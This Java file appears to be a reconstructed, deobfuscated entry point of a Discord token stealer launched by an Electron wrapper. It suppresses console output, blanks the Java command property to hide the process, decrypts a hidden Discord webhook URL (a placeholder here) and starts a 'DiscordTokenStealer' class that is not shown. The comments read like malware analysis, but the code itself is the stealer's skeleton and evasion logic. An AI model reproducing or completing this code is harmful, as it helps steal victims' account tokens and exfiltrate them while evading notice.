import java.io.PrintStream;
import java.io.OutputStream;

/**
 * Entry point class (obfuscated name: h)
 *
 * Called by Electron launcher with args from spawn():
 *   --enable-native-access=ALL-UNNAMED -cp modules.lib h
 *
 * Optional debug flag: pass "--ira" as argument to enable console output.
 */
public class EntryPoint {

    // 3-byte XOR key used to decrypt the webhook URL at runtime
    // Decrypted value: first 3 bytes of the obfuscated \u00ff field
    private static final byte[] WEBHOOK_KEY = new byte[3]; // decrypted at static init

    public static void main(String[] args) {
        boolean debugMode = false;

        // Check for --ira debug flag
        for (String arg : args) {
            if (arg.equalsIgnoreCase("--ira")) {
                debugMode = true;
                break;
            }
        }

        // Suppress all stdout/stderr unless in debug mode
        if (!debugMode) {
            try {
                PrintStream nullStream = new PrintStream(new OutputStream() {
                    public void write(int b) {}
                });
                System.setOut(nullStream);
                System.setErr(nullStream);
                // Hide from process list
                System.setProperty("sun.java.command", "   ");
            } catch (Throwable ignored) {}
        }

        // Decrypt webhook URL from obfuscated byte array
        String webhookUrl = decryptWebhookUrl();

        if (debugMode) {
            System.out.println("[EntryPoint] Debug mode active");
            System.out.println("[EntryPoint] Webhook: " + webhookUrl);
            return;
        }

        try {
            // Start the main stealer logic
            DiscordTokenStealer stealer = new DiscordTokenStealer(webhookUrl, false, args);
            stealer.start();
        } catch (Throwable ignored) {}
    }

    /**
     * Decrypts the hardcoded webhook URL.
     * Original: XOR of byte array \u00ff with DES-derived key stored in static field `a`.
     * The webhook URL is a Discord webhook (https://discord.com/api/webhooks/...)
     */
    private static String decryptWebhookUrl() {
        // Runtime decryption — actual value depends on DES key derived from class hash
        // The obfuscated bytes in h.\u00ff decrypt to the webhook URL
        return "<WEBHOOK_URL_DECRYPTED_AT_RUNTIME>";
    }
}
